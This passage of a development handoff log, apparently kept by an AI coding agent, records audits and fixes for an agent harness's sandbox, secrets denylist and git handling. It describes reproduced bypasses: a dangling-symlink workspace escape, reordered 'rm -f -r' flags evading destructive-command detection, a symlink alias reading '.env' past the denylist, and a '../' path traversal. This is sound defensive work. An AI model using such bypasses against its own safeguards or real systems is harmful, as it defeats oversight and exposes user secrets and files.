   header lines — an added line whose real content starts with `++`
   (renders `+++x; ...`) or a removed line starting with `--` was
   silently dropped before any cheat check ever saw it, letting e.g. a
   skip-marker addition hide inside a line shaped that way. Fixed by
   tracking whether a hunk (`@@ ... @@`) has been seen yet per file —
   header lines only ever appear before the first hunk.
6. **`classifyFailure` lint/typecheck `ENV_ERROR_RE` gap** — `build`/`test`
   both check `ENV_ERROR_RE` before trusting their own stage name (an
   environment failure — `ECONNREFUSED`, disk-full — isn't a task the
   model can fix by editing code); `lint`/`typecheck` skipped that check
   entirely, exactly the misclassification the surrounding comment warns
   against for the other two stages. Fixed by mirroring the check.
7. **Loop-detector key-order blind spot** (`agent-loop.ts` →
   `loop-detector.ts`) — `recordToolCall` was wired with the raw
   `argsJson` *string*, not the parsed object, so `stableStringify`'s
   whole documented purpose (canonicalize by sorted key order, so two
   calls with the same semantic args but differently-ordered JSON hash
   identically) never actually ran — it short-circuits to
   `JSON.stringify` on a non-object. Fixed by parsing `argsJson` before
   handing it to the detector, falling back to the raw string only on a
   parse failure.
8. **Provider stream-failure masking** (`openai-compatible.ts` +
   `anthropic.ts`) — three sub-bugs each, same root cause: a stream that
   ends (connection drop, in-band `{error:...}`/`event: error` with no
   `choices`/prior `stop_reason`) without ever producing a chunk the loop
   recognizes as terminal used to fall through silently, and `collect()`
   defaults `finishReason` to `"stop"` — a truncated or failed turn was
   reported as a normal, complete one. Also: OpenAI's `content_filter`
   and Anthropic's `refusal` finish/stop reasons fell through to `default`
   → `"stop"` instead of `"error"`; Anthropic's in-stream `error` event
   was hardcoded `retryable: false` regardless of the error's actual
   type (`overloaded_error` is Anthropic's own documented transient
   condition, same tier as an HTTP 529). Fixed with a `sawTerminal` flag
   yielding an explicit error if the stream ends without one, explicit
   `content_filter`/`refusal` → `"error"` mappings, and a
   `RETRYABLE_ANTHROPIC_ERROR_TYPES` set driving `retryable` from the
   error's real type.
9. **CLI `NaN` budget bypass** — `(v) => parseInt(v, 10)`/`parseFloat`
   silently produce `NaN` for a typo'd flag value, and the only check
   downstream is `!== undefined` (true for `NaN`) — reproduced for real:
   `clutchcode run ... --max-steps five` genuinely ran with the step
   budget silently set to `NaN` (visible verbatim in the CLI's own status
   output as `steps: 1/NaN`), since every `>=` comparison against `NaN`
   is `false`. Fixed with `parseIntArg`/`parseFloatArg` wrappers that
   throw `InvalidArgumentError` on `NaN`, giving a clean CLI rejection.
10. **CLI `--squash` always-on** — a plain `--squash` boolean defaulting
    to `true` had no `--no-squash` counterpart, so `ApproveOptions.squash
    === false` (a real, different `git merge --no-ff` code path in
    `approveRun`, preserving full checkpoint history) could never
    actually be reached from the CLI — reproduced: `--no-squash` errored
    "unknown option." Fixed by registering `--no-squash` instead (commander
    auto-negates the same underlying boolean).
11. **VS Code `cliPath` workspace-setting hijack** — `clutchcode.cliPath`
    had no `scope` declared (defaulting to `window`, settable from a
    workspace's own `.vscode/settings.json`), so any repo could redirect
    which binary the extension spawns with no prompt. Fixed by declaring
    `"scope": "machine"` — can only be set in User/Remote settings per
    VS Code's own documented contract. **Caveat, stated plainly:** no
    real VS Code extension host exists in this environment, so this can't
    be exercised end-to-end; the new test only proves the schema
    declaration itself is present and hasn't regressed.
12. **Credential-file-store silent data loss** — `fileStoreSet`/
    `fileStoreClear` treated any decrypt/parse failure of an *existing*
    `credentials.age` (rotated machine key, corrupted/truncated file)
    identically to "nothing stored yet," then silently overwrote the
    file with just the one account being touched — reproduced by
    corrupting a two-account store and confirming the corrupted bytes
    used to get clobbered by a fresh single-account envelope. Fixed by
    threading through an `existedButUndecryptable` flag from a new
    `readStoreDetailed` and refusing to write when it's set — `fileStoreGet`'s
    documented always-silent read contract is untouched.
13. **Truncate.ts positional-dedup bug** — `extraFailures` deduped shown
    vs. omitted failure lines by *text*, not position, so a repeated
    error string (very typical in a real CI log) appearing once in the
    shown head and again, genuinely distinctly, deep in the omitted
    middle made the omitted occurrence invisible. Fixed by tracking shown
    line *indices* instead of a text `Set`.
14. **Test-selection basename-only matching** — `selectImpactedTests`
    matched a changed file to a test file by basename alone, no
    directory relationship check, so an unrelated same-named test file
    anywhere else in the repo satisfied "this file was mapped" and
    suppressed the full-suite fallback while the real (different-
    basename) test never ran. Fixed with a `relatedDirs` check (same
    directory, a conventional test subdirectory, or a top-level `src/`+
    `test/`-style sibling split) — deliberately conservative so two
    same-parent module directories with unrelated names don't count.

608 → 653 tests (45 new), clean `tsc -b`, clean `eslint .`. One review
agent (sandbox/policy/redaction/tier1) did not complete — hit a session
API limit — and is genuinely unreviewed this round, not silently skipped.

### Autonomous-continuation convention ("start work" / "refer the handoff and work")

Not a code change — a process convention, requested directly: two trigger
phrases that let a session pick up this project's own continuation loop
without needing the exact task re-explained each time.

- **"start work"** spawns a background `general-purpose` subagent that
  reads `CLAUDE.md` + `HANDOFF.md`, picks the next unit of work, does it
  end to end (tests, the verify-before-fix discipline, build/test/lint,
  HANDOFF.md update, commit/push), and reports back — the orchestrating
  session relays that report to the user rather than fabricating one.
- **"refer the handoff and work"** (typically the first message of a
  fresh session) skips the subagent — the session itself reads
  `HANDOFF.md` + `CLAUDE.md` and starts the same work directly, no
  clarifying questions.

Implemented as two project skills (`.claude/skills/start-work/SKILL.md`,
`.claude/skills/refer-handoff/SKILL.md`) that pattern-match the trigger
phrases and point back at a new `CLAUDE.md` section, "Autonomous
continuation," which is the actual source of truth: it defines the shared
priority order for "what's the next unit of work" (an explicitly deferred
item from this file's latest "what's done" entry first, then the top row
of "What's left" below, then another audit round per the most recent
review round's methodology if neither exists) so both trigger phrases stay
in lockstep with each other and can't drift apart. Kept the actual
playbook in one place (`CLAUDE.md`) rather than duplicated across both
skill files, for the same "one shared thing, not two that can drift"
reason as this session's `assertSafeRunId` fix.

### Sandbox/policy/redaction security audit (§12/§5.2) — the round-3 subagent that hit a session limit, completed

Picked up per the autonomous-continuation priority order above: the
round-3 review's 9th subagent (sandbox/policy/redaction) never finished —
genuinely unreviewed, flagged "do first" in "what's left," not silently
skipped. Reviewed every file in that scope directly: `policy.ts`,
`denylist.ts`, `destructive.ts`, `env.ts`, `redactor.ts`, `tier1-linux.ts`,
`tier1-macos.ts`, `seccomp-linux.ts` (beyond the temp-path issue round 3
already fixed), plus the tool-layer callers that consume them
(`read-file.ts`/`write-file.ts`/`edit-file.ts`/`shell.ts`/
`workspace-path.ts`). Before any of that: this session's container had
neither `bubblewrap` nor `secret-tool`/`gnome-keyring` installed (a fresh
container, not the same one prior sessions configured) — 9 tests were
failing for that reason alone. Reinstalled both (`apt-get install
bubblewrap libsecret-tools gnome-keyring dbus-x11`) so the baseline is
genuinely verified against the real backends again, not skipped/mocked,
before starting the audit. Also cross-checked the full x86_64 seccomp
syscall table (`DENIED_SYSCALLS_X86_64`, all 22 entries) against this
host's own authoritative kernel header
(`/usr/include/x86_64-linux-gnu/asm/unistd_64.h`) — the existing real-bwrap
tests only empirically exercise 4 of the 22 syscalls; all 22 numbers match,
and the BPF jump-offset arithmetic was hand-traced for both boundary
indices (first/last denied syscall) and checks out. No bug there.

Three real findings, each reproduced for real before fixing and proven
with a test that fails against the pre-fix code and passes after (`git
stash push -- <file>`, confirm the new test fails, `git stash pop`,
confirm it passes):

1. **Follow-up gap in the round-2 `resolveInWorkspace` symlink fix** —
   that fix walked up to the deepest *existing* ancestor using
   `fs.existsSync`, which *follows* a symlink to decide existence. A
   **dangling** symlink (its target doesn't exist yet) therefore reported
   `existsSync === false` for its own path — indistinguishable, to that
   check, from an ordinary not-yet-created file — so the walk skipped
   straight past the symlink itself and re-appended it *unresolved* onto
   whatever ancestor existed above it. Reproduced for real: a dangling
   symlink `workspace/link -> /tmp/outside/pwned.txt` (the target
   directory exists, the target file does not) made `resolveInWorkspace`
   report `inside: true`, and `fs.writeFileSync(abs, ...)` — where `abs`
   is still the unresolved `workspace/link` — genuinely created
   `/tmp/outside/pwned.txt`, following the symlink exactly the way a real
   POSIX `open(..., O_CREAT)` does for a broken symlink whose parent
   directory exists. Fixed by replacing the single end-of-walk
   `realpathSync` call with a per-component resolver
   (`resolveRealAsFarAsPossible`) that walks via `fs.lstatSync` (reports a
   symlink's own existence without dereferencing it) and follows each
   symlink hop — including a dangling one — via `fs.readlinkSync`, only
   stopping at a component that doesn't exist *at all*. Six new tests
   across `workspace-path.test.ts` (the dangling-outside case, a dangling-
   but-inside control, a multi-hop chain with a dangling link mid-chain)
   and `read-write-edit.test.ts` (the same exploit through the real
   `write_file` tool).
2. **`isDestructiveCommand`'s `rm` detection bypassable by flag order or
   short/long-form mixing.** The pattern list was a fixed set of regex
   alternatives (`-rf`, `-fr`, `--recursive .. --force`, `--force ..
   --recursive`, bare short `-r`) — reproduced for real that `rm -f -r x`,
   `rm --force -r x`, `rm -f --recursive x`, and `rm --recursive x` (alone)
   are all functionally identical to already-flagged spellings per
   POSIX/GNU option parsing (order and short/long form don't change
   semantics) but matched none of the alternatives. This is directly
   reachable, not adversarial — an LLM has no reason to prefer the exact
   spellings the regex list happened to enumerate. Fixed by replacing the
   `rm`-specific regexes with `isDestructiveRm`: tokenizes each `rm`
   invocation's own argument list (segmented from any other command in a
   `;`/`&&`/`||`/`|`/newline-separated pipeline, so flags on one command
   never bleed into another) and checks for recursion independent of
   order or form — closing the whole reordering/mixing class at once
   instead of enumerating more concrete spellings. Six new tests in
   `destructive.test.ts`.
3. **§5.3 secrets denylist bypassable via a same-workspace symlink
   alias.** `Denylist.isDenied` does pure basename/suffix matching, and
   every call site (`read_file`, `write_file`, `edit_file`) checked it
   against `abs` — the *requested*, unresolved path — never the real
   target. A symlink entirely *inside* the workspace aliasing a
   denylisted file under an innocuous name (`notenv.txt -> .env`, both
   inside the workspace — `inside` was already correctly `true`, this is
   not the escape bug above) sailed straight past the denylist on both
   read and write. Reproduced for real: `read_file({path:
   "notenv.txt"})` returned the live `.env`'s content verbatim, and
   `write_file` through the same alias would have overwritten it. Fixed
   by having `resolveInWorkspace` also return `real` (the fully
   symlink-resolved target — the same value already computed internally
   for the containment check, just not previously exposed) and switching
   all three call sites to denylist-check `real` instead of `abs`. Four
   new tests (one at the `workspace-path.ts` unit level, two at the
   tool level for read and write, one asserting the original file's
   content survives the blocked write attempt).

664 tests total (up from 653; 11 new), clean `tsc -b`, clean `eslint .`.
This closes the "do first" row in "what's left" below — the sandbox/
policy/redaction subsystem now has a complete review pass, not a partial
one.

### Git worktree/dirty-tree correctness findings (§13.1/§13.3) — the five round-3-deferred fixes

Picked up per the autonomous-continuation priority order: nothing was
deferred in the prior session's own "what's done" entry, so this is the
row tagged "do first" in "what's left" (the table's literal top-to-bottom
order hadn't been re-sorted after the sandbox/policy/redaction row above
was completed and removed — treated the explicit "do first" tag as the
actual priority signal, consistent with how the *previous* session picked
its own "do first"-tagged row over the table's literal position). All five
confirmed-real findings from round 3's git-package audit, each reproduced
for real before fixing and proven with the full `git stash push -- <file>`
/ confirm-new-test-fails / `git stash pop` / confirm-passes cycle:

1. **`checkpoint()`'s post-`add -A` status check swallowed real git
   errors as "nothing to commit."** `git status --porcelain` genuinely
   exits 0 for a clean tree — it only exits non-zero for an actual
   failure (index lock, disk error, corruption) — so the existing
   `allowFailure: true` on that call meant a real error and a clean tree
   were indistinguishable to `checkpoint()`, silently skipping a
   checkpoint that should have existed right after `add -A` staged real
   content. Reproduced without mocking `checkpoint()` itself: a thin PATH
   shim intercepts exactly `git status --porcelain` (every other
   invocation, including the preceding `add -A`, still goes to the real
   binary) and fails it with a simulated "index file smaller than
   expected"-style error; pre-fix, `checkpoint()` returned `null` as if
   nothing changed, post-fix it throws. Fixed by removing `allowFailure`
   from that one call.
2. **`approveRun`/`discardRun` let a `restoreStash` failure read as "the
   whole operation failed," even after the merge/discard had already
   genuinely completed.** Reproduced for real: a user's local edit to a
   file gets auto-stashed, the run edits the *same* file differently and
   gets merged in cleanly (no merge conflict — the stash means
   `repoPath`'s copy is clean at merge time), then restoring the stash
   conflicts with the merge's own result — confirmed directly with a
   throwaway repo that a failed `git stash pop` leaves literal conflict
   markers in the file and, per git's own documented behavior ("The stash
   entry is kept in case you need it again"), never drops the stash
   either. Pre-fix, that pop's `GitError` propagated straight out of
   `approveRun` with no indication the merge itself had already succeeded.
   Fixed by catching just that failure and returning it as an optional
   `stashRestoreWarning` on `approveRun`'s/`discardRun`'s result instead of
   throwing — `mergedSha` is still returned normally either way.
3. **The auto-stash was identified by a positional `stash@{0}`, captured
   once at push time and reused verbatim at restore time.** A plausible
   manual `git stash` elsewhere on the same repo during a long-running run
   shifts every existing entry's position, so a later `restoreStash` could
   pop the wrong one. Reproduced directly: push the auto-stash, then push
   a second, unrelated manual stash (moving the auto-stash from position 0
   to 1); pre-fix, `discardRun` popped the *manual* stash's content instead
   of the auto-stash's, leaving the real auto-stash orphaned in the stash
   list forever. Fixed by capturing the stash's own commit SHA
   (`git rev-parse stash@{0}`, resolved right after the push) instead of a
   positional name, and resolving that SHA back to whatever position it
   currently occupies (`git stash list --format=%H`) at restore time.
4. **Neither dirty-tree strategy actually preserved the original
   staged/unstaged split**, despite a code comment on the temp-commit path
   claiming the tree was "left exactly as it was." For the stash strategy,
   reproduced with a fully-staged modification to a tracked file: plain
   `git stash pop` collapses it to unstaged (` M`) on restore, losing the
   staged bit entirely — confirmed empirically that git's own `--index`
   flag exists precisely to prevent this and does; fixed by adding
   `--index` to the pop. For the temp-commit strategy, `git add -A`
   unavoidably stages everything to capture untracked files in the temp
   commit, and `reset --soft HEAD~1` only moves HEAD back — it doesn't
   restore the index's prior split, so every file ended up staged
   afterward regardless of its original state. Fixed with a precise
   fix rather than a partial one: capture the index as a tree object via
   `git write-tree` *before* touching anything, then restore it verbatim
   via `git read-tree` afterward — both operate purely on the index, never
   the working tree, so this reproduces the original split exactly, proven
   with a file that was genuinely *partially* staged (some hunks staged,
   some not — the case `git stash --index` itself can't always get
   perfectly right, confirmed by direct comparison in a throwaway repo).
5. **`createRunWorktree` ran the destructive dirty-tree handling (stash/
   temp-commit) before the still-fallible `git worktree add`,** with no
   recovery path if anything after it failed — the `RunWorktree` object
   that would have carried `dirtyTreeResult.stashRef` back to a caller is
   only ever constructed on the success path. Reproduced with a real,
   plausible failure (a leftover branch from an earlier run reusing the
   same runId/slug, so `git worktree add -b <branch>` collides): pre-fix,
   the function just threw, leaving the user's auto-stashed changes
   invisible to anything downstream. Fixed by wrapping the post-
   `handleDirtyTree` logic in try/catch and auto-restoring the stash on
   failure (temp-commit needs no recovery — its own `reset --soft` +
   index-restore already leaves the working tree untouched), narrating the
   outcome either way (restored automatically, or — if even that
   fails — exactly which stash to recover by hand) in the thrown error so
   nothing is silently orphaned.

670 tests total (up from 664; 6 new — one per finding), clean `tsc -b`,
clean `eslint .`. This closes the "Git worktree/dirty-tree correctness
findings" row in "what's left" below; the `snapshot-backup.ts` `relPath`
traversal row (also round-3-deferred, currently unreachable dead code) is
untouched and still open.

### `snapshot-backup.ts` `relPath` path traversal (§13.4) — the last round-3-deferred finding, closed

Picked up per the autonomous-continuation priority order: the prior
session's own "what's done" entry explicitly flagged this row as still
open, and it also carries the "do first" tag in "what's left" — both
signals point at the same row, so no ambiguity this time.

`SnapshotBackup.snapshotBeforeFirstEdit` (the §13.4 non-git fallback: a
snapshot-vs-current backup used when there's no git worktree to isolate a
run) joins a caller-supplied `relPath` into two different roots —
`workspaceRoot` (to read the file's current content) and `backupDir` (to
store the backup) — via a bare `path.join`, with no traversal guard at
all. Reproduced for real before writing any fix, against a throwaway
workspace with deliberately distinct-depth roots (so the two escape
directions can't collide on the same absolute path and mask each other —
an early repro attempt with same-depth sibling roots did exactly that, the
"backup" and "victim" paths turned out identical and the escape was
invisible until the roots were re-nested at different depths): a `relPath`
built as `path.relative(workspaceRoot, someFileOutsideIt)` (e.g.
`"../canary.txt"`) made `snapshotBeforeFirstEdit` write its backup file
*outside* `backupDir` entirely — confirmed on disk, not just structurally —
and a later `rollback()` for the same `relPath` genuinely overwrote a file
*outside* `workspaceRoot` with backed-up content. Same class of bug as the
`runId` path traversal fixed in an earlier round (`run-id.ts`'s
`assertSafeRunId`), but `relPath` legitimately needs to carry subdirectory
structure (`"src/nested/file.ts"`), so the single-segment allow-list shape
`SAFE_RUN_ID_RE` uses isn't the right fit here.

Fixed with a new `@clutchcode/git` module, `rel-path.ts`:
`isSafeRelPath`/`assertSafeRelPath` reject the specific traversal
primitive itself (any `..` path segment, split on both `/` and `\`
regardless of the current platform's own separator, since `relPath` is
untrusted text that may assume a different convention than this process's
`path.sep`) plus absolute and Windows-drive/UNC-shaped input, and a
companion `assertContainedIn(root, resolved)` re-checks the actual joined
destination against its root as defense in depth — mirroring the
"structural allow-list plus a `path`-based containment re-check on the
resolved result" pattern already established for `runId`. `
snapshotBeforeFirstEdit` calls `assertSafeRelPath` first, then
`assertContainedIn` against both `src` and `dest` before touching disk or
recording the path as snapshotted — since it's the *only* entry point that
ever adds to `SnapshotBackup`'s internal `snapshotted` set (`diff()`/
`rollback()` only ever iterate that already-validated set, never take a
fresh `relPath`), this one chokepoint is genuinely sufficient, unlike
`runId` which needed the same validator wired into several independent
read/mutate paths.

Confirmed real and fixed, not just plausible: reverted `snapshot-backup.ts`
alone via `git stash push -- packages/git/src/snapshot-backup.ts`, re-ran
the new tests — all 5 traversal-specific tests failed against the pre-fix
code (the other 5 pre-existing/legitimate-path tests in the same file kept
passing, confirming the fix doesn't regress ordinary nested-path use), then
`git stash pop` and re-ran — all passed again. 17 new tests: 11 in a new
`rel-path.test.ts` (accepts ordinary and nested paths; rejects a leading,
buried, and bare `..`; rejects POSIX-absolute and Windows-drive/UNC-shaped
input even on POSIX; rejects a backslash-separated `..` even though POSIX
`path` itself wouldn't split on it; rejects empty string and embedded NUL;
`assertContainedIn`'s own accept/reject/string-prefix-vs-real-containment
cases) and 6 in `snapshot-backup.test.ts` (a legitimate nested-subdirectory
path still round-trips through snapshot+rollback; three direct rejection
cases; two full reproductions of the original disk-level escape, now
asserted to throw before any file gets written in either direction). 687
tests total (up from 670; 17 new), clean `tsc -b`, clean `eslint .`. This
closes the row in "what's left" — round 3's git-package audit (worktree/
dirty-tree correctness, prior entry, plus this one) is now fully resolved,
with nothing left deferred from that round.

### Windows sandbox Tier 1 (§12.5/§12.6, A11/Q5) — closed as a documented decision: doc-only, WSL2-recommended

Picked up per the autonomous-continuation priority order: nothing was left
deferred in the prior session's own "what's done" entry, so this was the
"do first"-tagged top row of "What's left." The row's own note flagged it
needed a decision first — native restricted-token/AppContainer vs. staying
WSL2-doc-only — before it could even be scoped as build-or-skip.

Read what `PROJECT_SPEC.md` itself already says, rather than treating the
row as blocked pending a fresh human call: §12.5's isolation-mechanism
comparison table rates the "Windows restricted token / AppContainer" row
**[C:Low]** — "weakest story; WSL2 preferred" — and §12.6's tiered-defaults
block spells out the fallback explicitly: `Windows→ WSL2 (recommended)
else restricted-token + ASK-heavy policy [C:Low]`. §29's self-review
(point 3) goes further and makes the call directly for a small team: "If
the team is <2, Phase 1 must shed the probe (defer to Phase 2) and Windows
sandbox (doc-only)." A11/Q5 (the assumptions/open-questions registers)
frame this as "decide Windows support level... doc-only vs code," with
Q5's own decision deadline set at "Phase 3" — several phases behind where
this project actually stands now. Taken together, this isn't spec silence
needing a fresh human call — it's the spec having already made the call,
with the low-confidence tag as its own stated reason, and simply never
having that call formally closed out in the registers built to record
exactly it.

Before writing anything, checked whether the runtime already matches this
decision or would need code changes to align with it. It already does,
and is already tested: `detectSandboxBackend()` (`packages/sandbox/src/
tier1.ts`) has no Windows-specific branch at all — any platform besides
`linux`/`darwin` (including `win32`) falls through to `backend: "none"`
with a `reason` string that explicitly names WSL2 as the recommended
path; `tier1.test.ts` already asserts that string contains both `"win32"`
and `"WSL2"`; and `agent doctor`'s `sandbox (§12.5/§12.6)` check
(`apps/cli/src/commands.ts`) surfaces that same `reason` verbatim to the
user, not a generic "unsupported." So the actual gap wasn't missing
behavior — it was that HANDOFF's "What's left" table and README's Status
section both described this as an *open* item ("confirm whether it's
worth building," "remains open too"), reading as unresolved work still
pending, when the spec, the code, and its tests already agree on the
answer.

Closed it as a documented decision rather than a build task:
1. `PROJECT_SPEC.md`'s A11 and Q5 registers marked resolved in place —
   doc-only, WSL2-recommended, pointing at §12.5's `[C:Low]` rating and
   §29's self-review call as the reasoning — rather than silently leaving
   two "decision needed" rows sitting unanswered forever in what the doc
   calls its "authoritative Phase-0 deliverable."
2. `README.md`'s Status section reworded from "remains open too" to state
   the resolved decision plainly, with the same reasoning and a pointer to
   the already-passing test that proves the runtime's `win32` fallback
   message actually names WSL2.
3. This entry, plus removing the row from "What's left" below with the
   "do first" tag moved to the next genuinely unblocked row (see there for
   which, and why).

No code or test changes were needed — the runtime and its test coverage
already matched the decision; the gap was purely a "what's left"/README
bookkeeping one. `PROJECT_SPEC.md`, `README.md`, and `HANDOFF.md` now all
agree the decision is made and closed, not to be revisited without new
information (e.g. concrete user demand for a native Windows sandbox
despite its own spec-rated weakness). Full suite still 687/687 passing,
clean `tsc -b`, clean `eslint .` — nothing here touched runtime behavior.

### Research pass: DeepSeek Harness evaluated — two blocked rows unblocked, one policy gap closed

Not a code change. Prompted directly by the user ("would deepseek harness help
our clutchcode in any way?"), evaluated for real rather than from memory:
cloned `deepseek-ai/deepseek-harness` @ `b150a55` (2026-08-21, MIT, TypeScript,
~2,734 src files across 55 workspace packages — the closest peer to this
project found so far: same language, same package manager, same test runner,
same problem), read its architecture/sandbox/ACP/compaction subsystems and its
published postmortems, and verified every load-bearing claim against a primary
source rather than its README (npm registry for package existence and version,
its own `LICENSE` files for the license split, `git rev-parse` for the pin).

**The honest headline: it does not change our architecture, and almost none of
it is adoptable.** Under our own §2 default the harness itself is
**STUDY-ONLY** like every other reference project, and its plugin/DI core
(Cordis) is explicitly *not* something to adopt — we chose direct package
boundaries (§20) and retrofitting a DI container would be a rewrite, not an
improvement. What it does deliver is three specific, concrete things:

1. **The Landlock blocker is retired.** That row has carried the same stated
   objection for several rounds — a native helper or vetted syscall binding
   "neither exists yet, and a hand-rolled one carries a worse failure mode
   (silently over-permissive, not fail-loud)." `@deepseek-ai/node-addon-landlock-run`
   is exactly that helper, is **BSD-3-Clause** (its own LICENSE, separate from
   the harness's MIT — a distinction that changes the verdict, so it is
   recorded separately in every provenance doc), is published on npm (`0.1.1`,
   confirmed live against the registry), and is **fail-closed by
   construction**, which is precisely the property the objection demanded.
   It also ships a prebuilt `linux-arm64`, so Landlock-on-arm64 does *not*
   inherit the blocker that stalls arm64 seccomp. Row rewritten with a
   four-step executable plan.
2. **ACP is actionable and was already promised.** `PROJECT_SPEC.md` names ACP
   in §18.1, §20 and §26 — our stdio binding is "deliberately the same shape as
   ACP" and §26's risk mitigation is to be "a client of these protocols rather
   than fighting them" — but we never implemented it, so no ACP client can
   actually talk to us. There is now an official SDK (`@agentclientprotocol/sdk`
   `0.25.1`) and a working reference consumer to study. As an **open protocol**
   this lands on the MCP verdict (**REUSE — protocol impl**), not clean-room.
   New row added, scoped as a second binding *alongside* `agent-rpc` so the VS
   Code extension is untouched.
3. **A real policy gap in our own docs, found by trying to answer the
   question.** `LICENSE_AND_REUSE_ANALYSIS.md` governs *source entering our
   tree* and says nearly everything is STUDY-ONLY "even when the license is
   permissive." It had **nothing to say about adding a dependency** — a
   different act with a different risk profile, and one we already do
   routinely (`ajv`, `commander`, `vitest`). Read literally, the doc would have
   forbidden consuming the Landlock helper for reasons that only apply to
   copying. New **§2a, "Depending on a package is not reusing its source"**:
   a comparison table (provenance, attribution, audit story, upstream fixes,
   coupling), the explicit statement that §2's default is a rule about
   *expression* not a preference for hand-rolling, the `ajv` precedent, and
   five binding conditions on the Landlock dependency specifically
   (depend-never-vendor; behind our own seam; fail-closed must be tested by us,
   not trusted; BSD-3-Clause attribution at manifest level; pinned because
   upstream advertises breaking changes).

Also captured: their published **postmortem 0004** documents a Landlock defect
we would very likely have shipped ourselves — a bare `'landlock-run: '`
substring match conflating a *benign* partial-ABI notice with a *fatal* launcher
error, so ripgrep's exit-1-for-no-matches surfaced as `SANDBOX_UNAVAILABLE`.
Our own `classifyFailure` has been bitten twice by that same over-broad-text-match
shape (the bare `"no such file or directory"` case, and the lint/typecheck
`ENV_ERROR_RE` gap), so the lesson — *status-gated* classification, never a
substring bag — is written into the Landlock row as a required step, not a
footnote. A fourth, lower-priority row (tool-result pruning as a distinct
compaction stage, §4.5) was added from their `compaction-tool-result-pruner`.

The Windows Tier 1 decision closed earlier on this branch is **explicitly not
reopened**: their native Windows rung self-reports `partial` enforcement, and
their design note rejects AppContainer for being unable to do arbitrary-path
reads at all — both of which *corroborate* §12.5's `[C:Low]` rating rather than
contradicting it. Recorded as a watch item with two named revisit conditions so
a future session doesn't relitigate it from the same evidence.

Docs touched: new `research/repos/deepseek-harness.md` (full note in
`00_METHOD.md §5`'s standard schema), `research/00_METHOD.md` inventory row
(with a footnote on the later clone date and the license split),
`LICENSE_AND_REUSE_ANALYSIS.md` (three table rows + new §2a; also corrected the
stale "the one genuine REUSE" line, which is now two — MCP and ACP),
`docs/PRIOR_ART.md` (four rows + corrected the blanket "all of the above are
STUDY-ONLY" claim), and this file. No code, no tests, no behavior change:
687/687 still passing, clean `tsc -b`, clean `eslint .`.

### Research pass: pi agent harness evaluated — a real latent provider gap, and a correction

Prompted by a second repo link with "now something useful from this."
Cloned `Derric01/pi_coding_agent` @ `f13e6a8` **after confirming the clone
matched the live remote HEAD** (`git ls-remote` — the user asked explicitly for
this, and it did match; single `main` branch).

**A correction worth recording, because it changed the whole verdict.** The
repo sits under a familiar owner name, and the first read of the situation was
"this is first-party work, so the clean-room rules don't bind." That was wrong:
`LICENSE` is **MIT © 2025 Mario Zechner** (the upstream pi harness, <https://pi.dev>,
published as `@earendil-works/*`) and this is a **fork**. The ordinary §2
STUDY-ONLY default therefore applies in full, exactly as for Aider or opencode.
Caught by reading the `LICENSE` file rather than trusting the repo's owner
prefix — worth generalizing: **a repo under a known owner is not evidence of
that owner's copyright**, and the LICENSE is the only thing that settles it.

**Cross-signal from the previous entry:** DeepSeek Harness's capability-seams
graph lists an `llm-pi-ai` package — i.e. it depends on this same
`@earendil-works/pi-ai`. Two independently-built serious harnesses converging on
one provider library says more about that library than either project alone.

**The concrete finding — real, latent, correctly scoped as not-yet-reachable.**
`pi-ai`'s stop/finish-reason vocabulary is materially wider than ours; the
interesting entry is Anthropic's **`pause_turn`**. Verified against Anthropic's
own published API documentation (not from memory, and not from pi-ai's
treatment of it): `pause_turn` means *the model paused a long-running turn and
the client is expected to resume it* — it arises with server-side tools
(web search / web fetch / code execution). Our `mapStopReason` in
`packages/providers/src/anthropic.ts` has no `pause_turn` case, so it falls
through `default:` to `"stop"` — the agent loop would treat a *paused* turn as
a *completed* one. That is precisely the defect signature round 3 found six
instances of ("a truncated or failed turn reported as a normal, complete one").

**Scoping it honestly, per "a finding can be real and mis-scoped at the same
time":**
- It is **not currently reachable**. `pause_turn` only occurs when the request
  declares Anthropic server tools; we declare none (grepped — no `web_search`,
  `web_fetch`, `code_execution`, or `server_tool` anywhere in `packages/providers`
  or `packages/tools`). Our tools are all client-side. Same category as the
  `snapshot-backup.ts` `relPath` row: confirmed real, currently dead, worth
  closing *before* the wiring exists rather than after.
- **pi-ai maps it to `"stop"` too** — deliberately, as a named case with the
  comment "Stop is good enough -> resubmit." So this is *not* "they got it right
  and we got it wrong." The difference is that theirs is an explicit, documented
  decision inside a loop that resubmits, while ours is an unnamed fallthrough in
  a loop that treats `"stop"` as terminal.
- Closing it properly is **not a one-liner**: `FinishReason` is
  `"stop" | "tool_use" | "length" | "error"` with no paused variant, so doing it
  right means adding one and deciding what `AgentLoop` does with it. That is a
  small design decision, deliberately left queued rather than made unilaterally.

Two rows added to "What's left" (the `pause_turn`/conformance row, and a
generated-model-catalog row that complements — does not replace — the §4.9
capability probe). Recorded explicitly as **not** worth doing: adopting `pi-ai`
as our provider layer. Its coverage and error vocabulary are better than ours,
but it pulls `@aws-sdk/client-bedrock-runtime`, `@google/genai`,
`@mistralai/mistralai`, `openai`, `@anthropic-ai/sdk`, `undici`, `proxy-agent`
and more into a local-first tool (§17) that hand-assembled a seccomp BPF filter
in TypeScript specifically to avoid *one* runtime dependency (§12.6). §2a's
"depend, don't copy" reasoning cuts both ways: the `ajv` precedent was ~4 small
transitive deps, not three cloud-vendor SDKs.

Docs touched: new `research/repos/pi-agent-harness.md`, plus inventory/licence/
prior-art rows in `research/00_METHOD.md`, `LICENSE_AND_REUSE_ANALYSIS.md`,
`docs/PRIOR_ART.md`, and this file. No code, no tests, no behavior change:
687/687 still passing, clean `tsc -b`, clean `eslint .`.

### Autonomous-continuation convention upgraded: one trigger, a bounded work loop, an explicit quality bar

Requested directly: *"I will just say start work, Claude should act like a
senior and build this product ... only Sonnet will work on it so quality is
key."* The convention previously did **one** unit per invocation and leaned on
the executor having internalized `CLAUDE.md`. Both were wrong for the actual
usage pattern.

Rewrote the playbook in `CLAUDE.md`'s "Autonomous continuation" section —
deliberately **there and not in the skill files**, preserving the existing
"one shared thing, not two that can drift" design; the two skills stay thin
triggers that point at it.

**What changed:**

1. **A bounded work loop instead of a single unit.** A *unit* is one "What's
   left" row taken end to end and checkpointed (gate clean → `HANDOFF.md`
   updated → `README.md` if user-visible → commit → push). After a unit the
   executor **continues to the next one** rather than stopping for permission.
   Bounded at **three units per invocation** so a run stays reviewable — the
   user just says the phrase again.
2. **Explicit stop conditions**, because an unattended run needs to know when
   *not* to push through: three units done; only blocked/watch/human-decision
   rows left; the gate won't come clean (never commit red, never skip or
   disable a test to reach green); the unit needs a decision the executor
   shouldn't make alone (product call, ADR amendment, public-API break, new
   runtime dependency, unverifiable security-critical work); or a claim can't
